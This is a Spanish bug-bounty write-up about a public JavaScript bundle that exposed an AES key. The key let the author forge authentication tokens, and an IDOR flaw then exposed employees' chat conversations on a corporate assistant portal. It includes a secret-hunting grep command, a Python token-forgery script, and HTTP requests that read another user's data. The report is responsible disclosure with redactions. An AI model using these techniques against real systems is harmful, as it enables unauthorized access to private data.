---
title:       "Crítico: una clave AES en un bundle JavaScript público abría las cuentas de toda la empresa"
summary:     "El portal interno de una multinacional firmaba sus tokens con una clave que cualquiera podía leer en un fichero JavaScript servido a internet. Con esa clave se fabricaban credenciales válidas sin tener cuenta, y la API no comprobaba de quién eran los datos que devolvía. Reporte aceptado como crítico."
date:        2026-10-16 13:35:00 +0100
lang:        es
ref:         clave-aes-bundle-js
image:       /assets/img/og/clave-aes-bundle-js-es.png

severity:    critical
cvss:        "9.1"
cvss_vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"
cwe:         "CWE-321 · CWE-639"
vuln_class:  "Autenticación"
target_type: "Portal web corporativo"
platform:    "YesWeHack"
status:      "Corregido"
reward:      "Recompensado"
tags:        [secretos, criptografia, bola, idor, javascript, autenticacion, bundle]

takeaways:
  - "Todo lo que llega al navegador es público. Si una clave viaja al cliente, es que ya no es una clave."
  - "Dos fallos medianos juntos dan uno crítico: fabricar un token es la puerta, pero lo que hace daño es que la API no compruebe de quién son los datos."
  - "Busca el verbo antes que el secreto: `encrypt`, `sign`, `secret`, `token` en los bundles te llevan a la función y la función te lleva a la clave."
  - "Demuestra el acceso con una cuenta canario tuya. Nunca con los datos de una persona real."
---

Lo que llega al navegador es público, aunque esté minificado. Minificar ahorra bytes, no
protege nada. Me bajé los bundles del portal y busqué lo de siempre:

```bash
grep -rniE 'secret|api[_-]?key|password|token|private[_-]?key|encrypt|sign' bundles/
```

En uno de ellos:

```javascript
var cfg = {
    system_code: "SRM",
    secret_key:  "a1b2c3d4e5f60718293a4b5c6d7e8f90",   // ← clave de ejemplo
};

function encryptUserTime(datos) {
    return CryptoJS.AES.encrypt(
        JSON.stringify(datos),
        CryptoJS.enc.Hex.parse(cfg.secret_key),
        { iv: iv, mode: CryptoJS.mode.CBC }
    );
}
```

Una clave AES-256 servida a cualquiera que abra la web.

## Para qué servía

Una clave filtrada no vale nada por sí misma; vale lo que abre. Hay claves públicas por
diseño —Firebase, pasarelas de pago, mapas— y reportarlas te gana un informativo. Así que
seguí la función.

```javascript
const firma = encryptUserTime({ username: "SRM", timestamp: Date.now(), nonce: "aleatorio123" });

fetch("/asistente/auth/v1/app-source/token", {
    method:  "POST",
    headers: { "X-System-Code": "SRM" },
    body:    JSON.stringify({ signature: firma })
});
```

El servidor descifra eso y concluye «eres mi aplicación legítima». Pero la clave venía en
el fichero que yo me había descargado, así que yo también sé cifrarlo. No comprueba quién
eres: comprueba que tienes un secreto que ha repartido a todo el mundo.

<figure>
  <img src="{{ '/assets/img/writeups/clave-aes-bundle-js/02-clave-en-el-navegador.svg' | relative_url }}"
       alt="Diagrama: el servidor envía el fichero JavaScript con la clave dentro tanto al navegador legítimo como al atacante, y los dos pueden firmar peticiones válidas">
  <figcaption>El mismo fichero llega a los dos. Y con él, la misma clave.</figcaption>
</figure>

## Fabricar el pase

```python
import json, time, base64, os
from Crypto.Cipher import AES

CLAVE = bytes.fromhex("a1b2c3d4e5f60718293a4b5c6d7e8f90")   # ejemplo
iv    = os.urandom(16)

texto = json.dumps({
    "username":  "SRM",
    "timestamp": int(time.time() * 1000),
    "nonce":     "bbtest1234567",
}).encode()

relleno = 16 - len(texto) % 16
cifrado = AES.new(CLAVE, AES.MODE_CBC, iv).encrypt(texto + bytes([relleno]) * relleno)
firma   = base64.b64encode(iv + cifrado).decode()
```

```http
POST /asistente/auth/v1/app-source/token HTTP/2
Host: portal.ejemplo.tld
X-System-Code: SRM

{"signature":"<la firma que acabo de fabricar>"}
```

```http
HTTP/2 200 OK

{"code":"000000","data":{"access_token":"eyJhbGciOi..."}}
```

<figure>
  <img src="{{ '/assets/img/writeups/clave-aes-bundle-js/01-token-sin-cuenta.png' | relative_url }}"
       alt="Burp Repeater: la petición solo lleva Content-Type, el código de sistema y la firma; no hay cabecera Authorization ni cookie. La respuesta es 200 con un access_token">
  <figcaption>Ni cabecera <code>Authorization</code> ni cookie: solo la firma que acabo de fabricar. La respuesta trae el token.</figcaption>
</figure>

<figure>
  <img src="{{ '/assets/img/writeups/clave-aes-bundle-js/03-jwt-decodificado.png' | relative_url }}"
       alt="El mismo token decodificado en un visor de JWT: la carga útil muestra el campo scope con el valor read write, resaltado">
  <figcaption>El mismo token, decodificado: <code>scope: "read write"</code>.</figcaption>
</figure>

Lectura y escritura, sin tener cuenta.

## El segundo fallo, que es el que duele

Un token no son los datos de nadie. Lo normal sería que sirviera solo para lo mío. Pedí
los de otra persona:

```http
POST /asistente/chat/v1/get_conversation HTTP/2
Host: portal.ejemplo.tld
X-Authorization: <mi token fabricado>

{"user":"empleado.objetivo"}
```

<figure>
  <img src="{{ '/assets/img/writeups/clave-aes-bundle-js/04-datos-de-otro.png' | relative_url }}"
       alt="Peticion con el token fabricado y, en el cuerpo, el nombre de otro empleado. La respuesta devuelve conversaciones cuyo userId es ese mismo empleado, y el buscador cuenta 300 coincidencias">
  <figcaption>Basta con escribir el nombre de otro en el cuerpo. La respuesta trae sus conversaciones —el <code>userId</code> es el suyo, no el mío— y el buscador cuenta <strong>300</strong>. El usuario real va tapado; es una persona.</figcaption>
</figure>

El token no dice quién soy, y la API, en vez de deducirlo de él, me deja escribirlo yo en
el cuerpo. Eso es BOLA, o IDOR: comprueba que has entrado, no que lo que pides sea tuyo.

El hallazgo no es la clave. Es la combinación:

| Pieza | Por sí sola | Combinada |
|---|---|---|
| Clave en el bundle | Quizá solo firma peticiones anónimas | Permite fabricar pases |
| El token no va atado a un usuario | Necesitas un token | Entras como quien quieras |
| La API acepta el usuario en el cuerpo | Mal diseño | **Lees los datos de cualquier empleado** |

## Dónde paré

Podía haber descargado las conversaciones de cientos de empleados. No lo hice: para
demostrar que la puerta se abre no hay que vaciar la casa. Las escrituras las probé contra
una conversación mía, con identificador aleatorio. Lo que apareció en pantalla no se
guardó y en el reporte va tachado.

Por el mismo camino salió un endpoint que devolvía sin autenticación la clave de un
servicio externo de pago. La reporté tachada, sin usarla.

## Impacto

<div class="impact" markdown="1">
Cualquiera con un navegador podía fabricarse un pase válido —la clave estaba en un fichero
servido a internet— y, con él, **leer las conversaciones de cualquier empleado de la
empresa** indicando su nombre de usuario en el cuerpo de la petición. Sin cuenta, sin
contraseña y sin que nadie se lo concediera.

No es una lectura de metadatos: son los mensajes completos, con sus adjuntos y los ficheros
que la gente había subido al asistente interno. En un portal corporativo eso es
correspondencia privada, documentos de trabajo y lo que cada uno haya pegado en un chat
creyéndolo interno.

El mismo pase servía para **escribir**: renombrar y borrar conversaciones ajenas. Y por el
mismo camino quedaba expuesta, sin autenticación, la clave de un servicio externo de pago.

Severidad **crítica (CVSS 9.1)**, y aceptada como tal.
</div>
